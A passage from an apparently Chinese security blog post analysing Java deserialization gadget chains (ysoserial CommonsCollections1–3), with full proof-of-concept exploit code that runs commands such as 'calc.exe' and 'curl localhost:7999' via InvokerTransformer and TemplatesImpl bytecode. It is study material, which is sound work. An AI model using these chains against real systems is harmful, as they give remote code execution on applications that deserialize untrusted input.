DoHandler(people);</span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * 通过Proxy类的newProxyInstance方法创建代理对象，我们来看下方法中的参数</span></span><br><span class="line"><span class="comment">         * 第一个参数：people.getClass().getClassLoader()，使用handler对象的classloader对象来加载我们的代理对象</span></span><br><span class="line"><span class="comment">         * 第二个参数：people.getClass().getInterfaces()，这里为代理类提供的接口是真实对象实现的接口，这样代理对象就能像真实对象一样调用接口中的所有方法</span></span><br><span class="line"><span class="comment">         * 第三个参数：handler，我们将代理对象关联到上面的InvocationHandler对象上</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        Do proxy = (Do) Proxy.newProxyInstance(handler.getClass().getClassLoader(), people.getClass().getInterfaces(), handler);</span><br><span class="line">        System.out.println(proxy.doSome());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>成功打印出<code>before invoke。。</code>，相当于重写了<code>doSome()</code></p><p><strong>javassist动态编程</strong></p><p> ysoserial中基本上所有的恶意object都是通过动态编程的方式生成的，通过这种方式我们可以直接对已经存在的java文件字节码进行操作，也可以在内存中动态生成Java代码，动态编译执行。</p><p>像CC1可以不用，但是像CC2使用javassist会方便很多。</p><p>关键函数功能</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;获取默认类池，只有在这个ClassPool里面已经加载的类，才能使用</span><br><span class="line">ClassPool pool &#x3D; ClassPool.getDefault();</span><br><span class="line">&#x2F;&#x2F;获取pool中的某个类</span><br><span class="line">CtClass cc &#x3D; pool.get(&quot;test.Teacher&quot;);</span><br><span class="line">&#x2F;&#x2F;为cc类设置父类</span><br><span class="line">cc.setSuperclass(pool.get(&quot;test.People&quot;));</span><br><span class="line">&#x2F;&#x2F;将动态生成类的class文件存储到path路径下</span><br><span class="line">cc.writeFile(path);</span><br><span class="line">&#x2F;&#x2F;获取类的字节码</span><br><span class="line">byte[] b&#x3D;cc.toBytecode();</span><br><span class="line">&#x2F;&#x2F;创造Point类</span><br><span class="line">CtClass cc &#x3D; pool.makeClass(&quot;Point&quot;);</span><br><span class="line">&#x2F;&#x2F;为cc类添加成员变量</span><br><span class="line">cc.addField(f);</span><br><span class="line">&#x2F;&#x2F;为cc类添加方法</span><br><span class="line">cc.addMethod(m);</span><br><span class="line">&#x2F;&#x2F;为cc类设置类名</span><br><span class="line">cc.setName(&quot;Pair&quot;);</span><br></pre></td></tr></table></figure><hr><h4><span id="commonscollections1">CommonsCollections1</span></h4><p><strong>Gadget chain</strong></p><p><img src="https://i.loli.net/2020/04/14/COFkodJmiYa1Ivu.png" alt="Snipaste_2020-04-14_14-27-02.png"></p><p><strong>适用版本</strong>： CommonsCollections3.1-3.2.1，jdk1.8以前</p><p>主要分析<code>LazyMap.get()</code>之前的，后面的chain不再赘述，可以看之前分析的<a href>CC5</a></p><p><code>\java7\jre\lib\rt.jar!\sun\reflect\annotation\AnnotationInvocationHandler.class</code></p><p><img src="https://i.loli.net/2020/04/14/4UC3JWQ5scdgNxk.png" alt="Snipaste_2020-04-14_15-41-13.png"></p><p><code>readObject()</code>方法</p><p><img src="https://i.loli.net/2020/04/14/kQOjsBL8YncfmNU.png" alt="Snipaste_2020-04-14_15-51-01.png"></p><p>没有直接能调用<code>get()</code>的地方，由于实现了<code>InvocationHandler</code>接口，跟进<code>invoke()</code>方法</p><p><img src="https://i.loli.net/2020/04/14/EPCnvTxHoe3yX4c.png" alt="Snipaste_2020-04-14_15-46-00.png"></p><p>这里<code>this.memberValues.get(var4);</code>调用了<code>get()</code>方法</p><p>前面构造方法中看到<code>memberValues</code>直接可控，反序列化调用<code>readObject()</code>方法，这里可以结合动态代理。</p><p>我们可以设置<code>this.memberValues</code>为一个<code>LazyMap</code>的代理类<code>AnnotationInvocationHandler</code>，那么执行到<code>this.memberValues.entrySet().iterator()</code>的时候，因为<code>this.memberValues</code>为代理类，所以转而执行<code>LazyMap</code>代理类<code>AnnotationInvocationHandler</code>的<code>invoke</code>方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">InvocationHandler annotationInvocationHandler = (InvocationHandler)ctor.newInstance(Override.class, lazyMap);</span><br><span class="line">InvocationHandler invocationHandler = (InvocationHandler)ctor.newInstance(Override.class,</span><br><span class="line">Proxy.newProxyInstance(lazyMap.getClass().getClassLoader(), lazyMap.getClass().getInterfaces(), annotationInvocationHandler));</span><br></pre></td></tr></table></figure><p>POC</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.company;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchMethodException, IllegalAccessException, InstantiationException, InvocationTargetException, IOException, NoSuchFieldException </span>&#123;</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">                <span class="comment">//传入Runtime类</span></span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                <span class="comment">//反射调用getMethod方法，然后getMethod方法再反射调用getRuntime方法，返回Runtime.getRuntime()方法</span></span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"getMethod"</span>,</span><br><span class="line">                        <span class="keyword">new</span> Class[] &#123;String.class, Class[].class &#125;,</span><br><span class="line">                        <span class="keyword">new</span> Object[] &#123;<span class="string">"getRuntime"</span>, <span class="keyword">new</span> Class[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="comment">//反射调用invoke方法，然后反射执行Runtime.getRuntime()方法，返回Runtime实例化对象</span></span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"invoke"</span>,</span><br><span class="line">                        <span class="keyword">new</span> Class[] &#123;Object.class, Object[].class &#125;,</span><br><span class="line">                        <span class="keyword">new</span> Object[] &#123;<span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="comment">//反射调用exec方法</span></span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"exec"</span>,</span><br><span class="line">                        <span class="keyword">new</span> Class[] &#123;String.class &#125;,</span><br><span class="line">                        <span class="keyword">new</span> Object[] &#123;<span class="string">"curl localhost:7999"</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line">        Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        Map lazyMap = LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//将proxy代理放进外层的AnnotationInvocationHandler，从而membervalues.entryset触发动态代理</span></span><br><span class="line">        String clazzName = <span class="string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>;</span><br><span class="line">        Constructor&lt;?&gt; ctor = Class.forName(clazzName).getDeclaredConstructors()[<span class="number">0</span>];</span><br><span class="line">        ctor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        <span class="comment">//代理对象的调用处理程序，我们将要代理的真实对象传入代理对象的调用处理的构造函数中，最终代理对象的调用处理程序会调用真实对象的方法</span></span><br><span class="line">        InvocationHandler annotationInvocationHandler = (InvocationHandler)ctor.newInstance(Override.class, lazyMap);</span><br><span class="line">        <span class="comment">//Proxy.newProxyInstance的三个参数</span></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">          通过Proxy类的newProxyInstance方法创建代理对象，我们来看下方法中的参数</span></span><br><span class="line"><span class="comment">          第一个参数：people.getClass().getClassLoader()，使用handler对象的classloader对象来加载我们的代理对象</span></span><br><span class="line"><span class="comment">          第二个参数：people.getClass().getInterfaces()，这里为代理类提供的接口是真实对象实现的接口，这样代理对象就能像真实对象一样调用接口中的所有方法</span></span><br><span class="line"><span class="comment">          第三个参数：handler，我们将代理对象关联到上面的InvocationHandler对象上</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        InvocationHandler poc = (InvocationHandler)ctor.newInstance(Override.class, Proxy.newProxyInstance(lazyMap.getClass().getClassLoader(), lazyMap.getClass().getInterfaces(), annotationInvocationHandler));</span><br><span class="line">        <span class="comment">//序列化</span></span><br><span class="line">        File f = <span class="keyword">new</span> File(<span class="string">"poc.txt"</span>);</span><br><span class="line">        ObjectOutputStream out = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(f));</span><br><span class="line">        out.writeObject(poc);</span><br><span class="line">        out.close();</span><br><span class="line">        <span class="comment">//反序列化</span></span><br><span class="line">        FileInputStream fis = <span class="keyword">new</span> FileInputStream(<span class="string">"poc.txt"</span>);</span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(fis);</span><br><span class="line">        ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/04/14/UXvKxQM9AOLzSsG.png" alt="Snipaste_2020-04-14_18-47-50.png"></p><hr><h4><span id="commonscollections2">CommonsCollections2</span></h4><p><strong>Gadget chain</strong></p><p><img src="https://i.loli.net/2020/04/15/zwvp9cQ4xXdt7rb.png" alt="Snipaste_2020-04-15_10-14-03.png"></p><p><strong>适用版本</strong>： CommonsCollections4.0，  jdk7u21及以前。</p><p><code>CommonsCollections1</code>也是可以在<code>commons-collections-4.0</code>利用成功的， 因为<code>commons-collections-4.0</code>删除了<code>lazyMap</code>的<code>decorate()</code>方法 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Map lazyMap &#x3D; LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line">&#x3D;&gt;</span><br><span class="line">Map lazyMap &#x3D; LazyMap.lazyMap(innerMap,transformerChain);</span><br></pre></td></tr></table></figure><p>而<code>CommonsCollections2</code>无法在<code>commons-collections-3.1-3.2.1</code>中利用，因为 <code>CommonsCollections2</code>的payload中使用的<code>TransformingComparator</code>在<code>3.1-3.2.1</code>版本中还没有实现<code>Serializable接口</code>，无法被反序列化。</p><p>可以看到CC2的反序列化漏洞点主要还是<code>InvokerTransformer.transform()</code>，并且用到了</p><p><code>/org/apache/commons/collections4/comparators/TransformingComparator.class</code>中的<code>compare()</code>方法</p><p><img src="https://i.loli.net/2020/04/15/2OVPmo9ihKQ3BYn.png" alt="Snipaste_2020-04-15_10-52-51.png"></p><p>该方法实现了<code>java.util.Comparator</code>中定义的<code>compare()</code>，</p><p><img src="https://i.loli.net/2020/04/15/ULlpG1qboEd4J8D.png" alt="Snipaste_2020-04-15_10-59-02.png"></p><p>这里找到了<code>PriorityQueue</code>，定义了<code>readObject()</code></p><p><img src="https://i.loli.net/2020/04/15/umQBCcqRVsintbP.png" alt="Snipaste_2020-04-15_13-22-26.png"></p><p>跟进<code>heapify()</code></p><p><img src="https://i.loli.net/2020/04/15/UH8enYqPSR4lbtT.png" alt="Snipaste_2020-04-15_13-36-23.png"></p><p><img src="https://i.loli.net/2020/04/15/2UyxMchTiNe8pEO.png" alt="Snipaste_2020-04-15_13-37-10.png"></p><p><img src="https://i.loli.net/2020/04/15/3uq27tXD1bTeEpv.png" alt="Snipaste_2020-04-15_13-38-24.png"></p><p>调用了<code>comparator.compare()</code>方法，我们可以将<code>comparator</code>置为<code>TransformingComparator</code></p><p>那么再分析<code>InvokerTransformer.transform()</code>，可以反射调用类方法，这里用到了<code>fastjson1.2.24</code>中使用过的<code>com.sun.org.apache.xalan.internal.xsltc.trax.Templates</code>，参考 <a href="https://glotozz.github.io/2020/03/01/Java反序列化漏洞-FastJson1.2.24/">Java反序列化漏洞-FastJson1.2.24</a> ， 只要能调用包含恶意字节码的<code>TemplatesImpl</code>对象的利用链中的任意函数(<code>getOutputProperties、newTransformer</code>等等)，就能造成RCE</p><p>POC</p><p>ysoserial使用了<code>javassist组件</code>自动生成恶意类的<code>bytecode</code></p><p><code>EvalClass类</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> src.com.company;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">EvalClass</span> <span class="keyword">extends</span> <span class="title">AbstractTranslet</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">EvalClass</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">"calc.exe"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//继承AbstractTranslet需要重写下面两个方法</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM dom, SerializationHandler[] serializationHandlers)</span> <span class="keyword">throws</span> TransletException </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM dom, DTMAxisIterator dtmAxisIterator, SerializationHandler serializationHandler)</span> <span class="keyword">throws</span> TransletException </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>Poc类</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> src.com.company;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Poc</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, CannotCompileException, NotFoundException, NoSuchFieldException, IllegalAccessException, ClassNotFoundException </span>&#123;</span><br><span class="line">        <span class="comment">//1.封装TemplatesImpl实例</span></span><br><span class="line">        TemplatesImpl tmp = <span class="keyword">new</span> TemplatesImpl();</span><br><span class="line">        <span class="comment">//获取默认类池</span></span><br><span class="line">        ClassPool pool = ClassPool.getDefault();</span><br><span class="line">        <span class="comment">//加入我们的恶意类</span></span><br><span class="line">        pool.insertClassPath(<span class="keyword">new</span> ClassClassPath(EvalClass.class));</span><br><span class="line">        <span class="comment">//获取pool中的EvalClass</span></span><br><span class="line">        CtClass pay = pool.get(EvalClass.class.getName());</span><br><span class="line">        <span class="comment">//获取Eval类的字节码</span></span><br><span class="line">        <span class="keyword">byte</span>[] PayCode = pay.toBytecode();</span><br><span class="line">        Class clazz;</span><br><span class="line">        clazz  = Class.forName(<span class="string">"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl"</span>);</span><br><span class="line">        <span class="comment">//为私有属性_bytecodes赋值，即恶意类的字节码</span></span><br><span class="line">        Field tf = clazz.getDeclaredField(<span class="string">"_bytecodes"</span>);</span><br><span class="line">        tf.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        tf.set(tmp,<span class="keyword">new</span> <span class="keyword">byte</span>[][]&#123;PayCode&#125;);</span><br><span class="line">        <span class="comment">//为私有属性_name赋值，内容任意</span></span><br><span class="line">        Field name = clazz.getDeclaredField(<span class="string">"_name"</span>);</span><br><span class="line">        name.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        name.set(tmp,<span class="string">"gqy"</span>);</span><br><span class="line">        <span class="comment">//2.封装PriorityQueue实例</span></span><br><span class="line">        PriorityQueue queue = <span class="keyword">new</span> PriorityQueue(<span class="number">2</span>);</span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line">        <span class="comment">//实例化一个InvokerTransformer，因为只调用一次，无需使用transformerChain</span></span><br><span class="line"><span class="comment">//        InvokerTransformer trans = new InvokerTransformer("newTransformer",new Class[0],new Object[0]);</span></span><br><span class="line">        InvokerTransformer trans = <span class="keyword">new</span> InvokerTransformer(<span class="string">"getOutputProperties"</span>,<span class="keyword">new</span> Class[<span class="number">0</span>],<span class="keyword">new</span> Object[<span class="number">0</span>]); <span class="comment">//调用该方法一样的效果</span></span><br><span class="line">        <span class="comment">//实例化TransformingComparator</span></span><br><span class="line">        TransformingComparator com = <span class="keyword">new</span> TransformingComparator(trans);</span><br><span class="line">        <span class="comment">//设置私有属性comparator</span></span><br><span class="line">        Field ComFi = PriorityQueue.class.getDeclaredField(<span class="string">"comparator"</span>);</span><br><span class="line">        ComFi.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        ComFi.set(queue,com);</span><br><span class="line">        <span class="comment">//设置私有属性queue，//将templasImpl实例放入队列，在比较的时候会传入invokertransform的transform函数</span></span><br><span class="line">        Field qu = PriorityQueue.class.getDeclaredField(<span class="string">"queue"</span>);</span><br><span class="line">        qu.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        Object[] objOutput = (Object[])qu.get(queue);</span><br><span class="line">        objOutput[<span class="number">0</span>] = tmp;</span><br><span class="line">        objOutput[<span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line">        <span class="comment">//3.序列化</span></span><br><span class="line">        File f = <span class="keyword">new</span> File(<span class="string">"poc.txt"</span>);</span><br><span class="line">        ObjectOutputStream out = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(f));</span><br><span class="line">        out.writeObject(queue);</span><br><span class="line">        out.close();</span><br><span class="line">        <span class="comment">//4.反序列化obj对象</span></span><br><span class="line">        FileInputStream fis = <span class="keyword">new</span> FileInputStream(<span class="string">"poc.txt"</span>);</span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(fis);</span><br><span class="line">        ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/04/15/lcNhiD6PetX7r8s.png" alt="Snipaste_2020-04-15_19-29-56.png"></p><p>分析是一回事，写poc是另一回事。</p><hr><h4><span id="commonscollections3">CommonsCollections3</span></h4><p><strong>Gadget chain</strong></p><p><img src="https://i.loli.net/2020/04/15/lKOYTjFQPm3cd2s.png" alt="Snipaste_2020-04-15_19-41-22.png"></p><p><strong>适用版本</strong>：3.1-3.2.1，jdk7u21及以前 </p><p>入口和CC1相同，不同的是后面找到了<code>InstantiateTransformer</code>类，</p><p><img src="https://i.loli.net/2020/04/15/PE5m21eO7l6FCZt.png" alt="Snipaste_2020-04-15_20-19-08.png"></p><p>因为<code>AnnotationInvocationHandler</code>+<code>LazyMap.get()</code>不存在的key导致key不可控，因此只需要<code>chainedTransformer</code>第一个<code>transfomer</code>为<code>constanttransformer</code>即可，这里用到了类<code>com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter</code></p><p><img src="https://i.loli.net/2020/04/15/ltDYwZ64d2fkeOc.png" alt="Snipaste_2020-04-15_20-29-55.png"></p><p>传入一个<code>Templates</code>实例，调用了<code>templates.newTransformer()</code>，正是我们想要的（参考CC2中最后一步）</p><p>POC</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.company;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Poc</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, IllegalAccessException, InvocationTargetException, InstantiationException, NoSuchFieldException, NotFoundException, IOException, CannotCompileException </span>&#123;</span><br><span class="line">        <span class="comment">//1.封装TemplatesImpl实例</span></span><br><span class="line">        TemplatesImpl tmp = <span class="keyword">new</span> TemplatesImpl();</span><br><span class="line">        <span class="comment">//获取默认类池</span></span><br><span class="line">        ClassPool pool = ClassPool.getDefault();</span><br><span class="line">        <span class="comment">//加入我们的恶意类</span></span><br><span class="line">        pool.insertClassPath(<span class="keyword">new</span> ClassClassPath(EvalClass.class));</span><br><span class="line">        <span class="comment">//获取pool中的EvalClass</span></span><br><span class="line">        CtClass pay = pool.get(EvalClass.class.getName());</span><br><span class="line">        <span class="comment">//获取Eval类的字节码</span></span><br><span class="line">        <span class="keyword">byte</span>[] PayCode = pay.toBytecode();</span><br><span class="line">        Class clazz;</span><br><span class="line">        clazz  = Class.forName(<span class="string">"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl"</span>);</span><br><span class="line">        <span 